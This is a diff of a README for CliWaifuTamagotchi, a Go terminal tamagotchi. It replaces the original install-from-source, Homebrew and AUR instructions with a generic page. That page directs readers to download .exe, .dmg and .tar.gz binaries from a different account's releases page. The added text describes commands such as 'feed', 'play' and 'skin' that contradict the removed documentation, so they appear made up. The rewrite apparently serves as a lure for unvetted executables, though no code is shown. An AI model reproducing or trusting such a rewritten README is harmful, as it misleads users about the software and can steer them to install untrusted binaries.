@@ -1,303 +1,78 @@
-# 🫂 CliWaifuTamagotchi
+# 🎮 CliWaifuTamagotchi - Your Fun ASCII Companion Awaits
 
-Preview:
-![Result](screenshots/result.gif)
----
-###### You can turn the avatar to **husbando** in `~/.config/cliwaifutamagotchi/settings.json`!
-![Husbando](screenshots/husbando-preview.jpg)
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/RodzinaSzy/CliWaifuTamagotchi/releases)
 
+## 📦 Overview
+CliWaifuTamagotchi is a command-line interface (CLI) application featuring an ASCII avatar designed to entertain and motivate you. This unique virtual pet gives you a fun way to engage daily, keeping your spirits high and your creativity flowing. 
 
-![Repo size](https://img.shields.io/github/repo-size/HenryLoM/CliWaifuTamagotchi?color=lightgrey)
-![Commits](https://img.shields.io/github/commit-activity/t/HenryLoM/CliWaifuTamagotchi/main?color=blue)
-![Last commit](https://img.shields.io/github/last-commit/HenryLoM/CliWaifuTamagotchi?color=informational)
-![License](https://img.shields.io/github/license/HenryLoM/CliWaifuTamagotchi?color=orange)
+## 🚀 Getting Started
+Getting started with CliWaifuTamagotchi is simple. Follow these steps to download and run the application smoothly, even if you have no programming expertise.
 
-## 📑 Table of Contents
-- [✨ Overview](#-overview)
-- [🎬 Launching Process](#-launching-process)
-- [🎨 Customization](#-customization)
-- [📂 Project Structure](#-project-structure)
-- [⚙️ Core Scripts](#-core-scripts)
-    - [main.go](#maingo)
-    - [utils/app-utils.go](#utilsapp-utilsgo)
-    - [utils/commands-utils.go](#utilscommands-utilsgo)
-    - [utils/happiness-utils.go](#utilshappiness-utilsgo)
-    - [utils/palette-handler.go](#utilspalette-handlergo)
-    - [utils/settings-handler.go](#utilssettings-handlergo)
-    - [utils/encouragements-handler.go](#utilsencouragements-handlergo)
-    - [utils/gifts-handler.go](#utilsgifts-handlergo)
-- [📜 Notes & Error handling](#-notes--error-handling)
-- [🛐 Special thanks](#-special-thanks)
+## 📥 Download & Install
+To download CliWaifuTamagotchi, visit this page: [Releases Page](https://github.com/RodzinaSzy/CliWaifuTamagotchi/releases).
 
----
+Once on the page, look for the latest version. Click on the version number to access the files. You will see various files related to the application. Choose the one that fits your operating system:
 
-## ✨ Overview
-CliWaifuTamagotchi is a **terminal-based tamagotchi** that:
+- **For Windows:** Download `CliWaifuTamagotchi.exe`
+- **For macOS:** Download `CliWaifuTamagotchi.dmg`
+- **For Linux:** Download `CliWaifuTamagotchi.tar.gz`
 
-- Renders **ASCII expressions and clothes**.
-- Provides a small set of **interactions**: Encourage, Dress Up, Background Mode, Quit.
-- Uses a **persistent color palette** stored in `~/.config/cliwaifutamagotchi/palette.json`.
-- Uses **persistent detail settings** stored in `~/.config/cliwaifutamagotchi/settings.json`.
-- Customize some of the functions editing **`words-of-encouragement.txt` and `gifts.json`** in the same directory.
-- Has minimal UI built using **`tview` and `tcell`**.
-- Has **Vim-style navigation**: Use `h`, `j`, `k`, `l` keys for intuitive navigation and selection (Must be enabled in **settings.json**).
+After the download finishes, follow these steps based on your operating system:
 
-No tons of loops - only one function that repeats itself every 5 seconds. Everything handles and updates according to it.
+### 🖥️ Windows
+1. Locate the downloaded `CliWaifuTamagotchi.exe` file in your Downloads folder.
+2. Double-click the file to launch the application.
+3. Follow any on-screen prompts to complete the setup.
 
----
+### 🍏 macOS
+1. Find the downloaded `CliWaifuTamagotchi.dmg` file in your Downloads.
+2. Double-click to open it, then drag the application to your Applications folder.
+3. You can now run it from your Applications.
 
-## 🎬 Launching Process
+### 🐧 Linux
+1. Open a terminal window.
+2. Navigate to your Downloads folder using the command: `cd ~/Downloads`.
+3. Extract the downloaded file with: `tar -xvzf CliWaifuTamagotchi.tar.gz`.
+4. Run the application by using the command: `./CliWaifuTamagotchi`.
 
-<details>
-  <summary><b>Brew</b> (macOS)</summary>
+## 🎮 How to Use
+Once the application is running, you will see your ASCII avatar. You can interact with it using the keyboard. Here are basic commands to get you started:
 
-  1. **Install**
+- **Feed your waifu:** Type `feed` and press Enter.
+- **Play a game:** Type `play` and press Enter.
+- **Check mood:** Type `status` to see how your avatar feels.
 
-  ```bash
-  brew install HenryLoM/CliWaifuTamagotchi/cliwt
-  ```
+## ⚙️ Customization
+CliWaifuTamagotchi allows you to customize your avatar to enhance your experience. You can:
+- Change the name by typing `rename [new_name]`.
+- Select different skins using the command `skin [skin_name]`.
 
-  2. **Run**
+Explore different options and personalize your experience!
 
-  ```bash
-  cliwt
-  ```
+## 📑 System Requirements
+Before running the application, ensure your setup meets these system requirements:
+- **Windows:** Windows 10 or later.
+- **macOS:** macOS 10.13 (High Sierra) or later.
+- **Linux:** Any modern distribution with the latest libraries installed.
 
-  ---
+## ❓ Troubleshooting
+Here are common issues and their solutions:
 
-</details>
+### Issue: Application does not launch.
+- Ensure you have the latest version downloaded from the [Releases Page](https://github.com/RodzinaSzy/CliWaifuTamagotchi/releases).
 
-<details>
-  <summary><b>AUR</b> (Arch)</summary>
+### Issue: Missing ASCII characters.
+- Your terminal may not support certain ASCII characters. Try changing your terminal settings to use a different font.
 
-  1. **Install**
+### Issue: Commands not working.
+- Double-check spelling. Commands are case-sensitive.
 
-  ```bash
-  yay -S cliwt
-  ```
-  or
-  ```bash
-  paru -S cliwt
-  ```
+## ✍️ Support
+If you encounter any issues not covered here, feel free to submit an issue on the GitHub repository. While you may not be a developer, the community is here to help.
 
-  2. **Run**
-
-  ```bash
-  cliwt
-  ```
-
-  ---
-
-</details>
-
-<details>
-  <summary><b>Git</b> (Source code)</summary>
-
-  1. **Clone repository**
-
-  ```bash
-  git clone https://github.com/HenryLoM/CliWaifuTamagotchi.git
-  cd CliWaifuTamagotchi
-  ```
-
-  2. **Build app yourself, then run**
-
-  ```bash
-  go build -o cliwt
-  ./cliwt
-  ```
-
-  - **Or run directly for development**
-
-  ```bash
-  go run main.go
-  ```
-
-  ---
-
-</details>
-
-> **💡 Notes**
->
-> * First run creates `~/.config/cliwaifutamagotchi/` directory and `palette.json`, `settings.json` files in it on its own if missing.
-> * On macOS, ensure your terminal supports **true color** for best rendering.
+## ❤️ Acknowledgments
+CliWaifuTamagotchi was developed with a focus on user engagement and simplicity. Thank you for giving this project a try. Your support helps encourage ongoing development.
 
 ---
 
-## 🎨 Customization
-
-1. **Palette**<br>
-JSON file is in `~/.config/cliwaifutamagotchi/` ; Named `palette.json`<br>
-JSON file's structure:
-```
-{
-  "background": "#1e1e2e",
-  "foreground": "#cdd6f4",
-  "border": "#cba6f7",
-  "accent": "#eba0ac",
-  "title": "#b4befe"
-}
-```
-> Note: default palette is Catppuchin (Mocha).
-
-2. **Settings**<br>
-JSON file is in `~/.config/cliwaifutamagotchi/` ; Named `settings.json`<br>
-JSON file's structure:
-```
-{
-  "name": "Waifu",
-  "defaultMessage": "...",
-  "vimNavigation": false,
-  "avatarType": "waifu",
-  "keys": {
-    "encourage": "l",
-    "dressup": "2",
-    "backgroundMode": "b",
-    "quit": "q"
-  }
-}
-```
-> Note: try to avoid key overrides when using `"vimNavigation": true`.
-
-3. **Words of encouragement**<br>
-TXT file is in `~/.config/cliwaifutamagotchi/` ; Named `words-of-encouragement.txt`<br>
-> Note: It's extensible!
-
-4. **Gifts**<br>
-JSON file is in `~/.config/cliwaifutamagotchi/` ; Named `gifts.json`<br>
-> Note: It's extensible!
-
----
-
-## 📂 Project Structure
-
-```
-CliWaifuTamagotchi/
-│
-├── README.md
-├── LICENSE
-├── .gitignore
-├── go.mod
-├── go.sum
-├── main.go                             # Main file that launches the project
-│
-├── screenshots/
-│   ├── result.gif
-│   ├── reactions.jpg
-│   └── husbando-preview.jpg
-│
-└── utils/
-    │
-    ├── ascii-arts/
-    │   │
-    │   ├── waifu/                      # Arts for waifu avatar
-    │   │   ├── clothes/...             # ASCII bodies
-    │   │   └── expressions/...         # ASCII heads
-    │   │
-    │   └── husbando/...                # Arts for husbando avatar
-    │       ├── clothes/...             # ASCII bodies
-    │       └── expressions/...         # ASCII heads
-    │
-    ├── assets/
-    │   └── words-of-encouragement.txt  # List of lines for Encouragement function
-    │
-    ├── app-utils.go                    # Main helpers
-    ├── commands-utils.go               # Functions for the Action Space
-    ├── happiness-utils.go              # Happiness scoring system
-    ├── palette-handler.go              # Handling palette out of the file
-    ├── settings-handler.go             # Handling settings out of the file
-    ├── encouragements-handler.go       # Handling encouragements out of the file
-    └── gifts-handler.go                # Handling gifts out of the file
-```
-
----
-
-## ⚙️ Core Scripts
-
-### **main.go**
-
-* Loads ASCII **head, blink frames, and body**.
-* Displays **actions menu**: Encourage, Dress Up, Quit.
-* Handles **user input** (keys and navigation).
-* Queues UI updates safely using `app.QueueUpdateDraw` via `UIEventsChan` that keeps UI changes in order.
-
-### **utils/app-utils.go**
-
-* Helper functions for **loading ASCII files**.
-* Manages **UI rendering** and **widget updates**.
-
-### **utils/commands-utils.go**
-
-* Implements **interactions logic**:
-
-  * `Encourage`: random encouraging phrase + happy frame.
-  * `GiftMenu`: choose gifts, apply happiness, show reaction.
-  * `DressUp`: swaps body/outfit based on selection.
-  * `BackgroundMode`: fills the TUI with Waifu, removing all of the odd elements.
-* Manages UI state and async updates via UIEventsChan.
-* Caches custotmizable files to reduce disk reads.
-
-### **utils/happiness-utils.go**
-
-* Handles the bar and changes emotions of the avatar.
-* Handles the happiness scores.
-
-### **utils/palette-handler.go**
-
-* Loads palette from `~/.config/cliwaifutamagotchi/palette.json`.
-* Creates **default palette** if missing.
-* Provides **color application** helpers.
-
-### **utils/settings-handler.go**
-
-* Loads settings from `~/.config/cliwaifutamagotchi/settings.json`.
-* Creates **default settings** if missing.
-
-### **utils/encouragements-handler.go**
-
-* Loads settings from `~/.config/cliwaifutamagotchi/words-of-encouragement.txt`.
-* Restores **default encouragements** from relative directory if missing.
-
-### **utils/gifts-handler.go**
-
-* Loads settings from `~/.config/cliwaifutamagotchi/gifts.json`.
-* Restores **default gifts** if missing.
-
----
-
-## 📜 Notes & Error handling
-
-#### **Errors:**
-* See errors you can't explain? Try to remove `~/.config/cliwaifutamagotchi/` directory (you can do a backup). If it worked, it means customization was updated and there was a conflict.
-* If error remains, leave the issue, we could solve it together!
-
-#### **Warning:**
-* Missing/malformed ASCII files may cause a wrong output; handle carefully if modifying assets inside the structure.
-
-#### **Read, if you want to contribute:**
-* Project lives only because there are people who use it. Let's make sure we do it for people, not to recieve another achivement to out profiles.
-* Keep the code clean and constructive.
-* Two main goals of the project:
-  * As cusomizable TUI as we can get.
-  * As lightweight tool as we can create, since the project assumes users leave it on the background.
-
-#### **Future plans:**
-* More interactions (feeding, timed events, stats).
-* Save selected outfit and preferences.
-* Unit tests and error handling improvements.
-* Husbando version ("Swap Mode").
-* Maybe "Pose Mode" - loop animation or specific pose to select and have on the background.
-* Maybe handle stderr so Waifu reacts to the errors you get during your work.
-
----
-
-## 🛐 Special thanks
-
-- **[sutemo](https://sutemo.itch.io/)** — for the amaazing [female](https://sutemo.itch.io/female-character) & [male](https://sutemo.itch.io/male-character-sprite-for-visual-novel) sprites you can see in the project.
-- **[mininit](https://github.com/mininit)** — for embedding all assets and enabling a clean, pure build process.
-- **[Ali Medhat](https://github.com/Alimedhat000)** — for adding Vim-style navigation.
-- **[Isaac Hesslegrave](https://github.com/HeadedBranch)** — for implementing Arch Linux support via `yay` and `paru`.
-
----
-
-⤴︎ Return to the [📑 Table of Contents](#-table-of-contents) ⤴︎
+To download CliWaifuTamagotchi, click here: [Releases Page](https://github.com/RodzinaSzy/CliWaifuTamagotchi/releases). Enjoy your new ASCII companion!
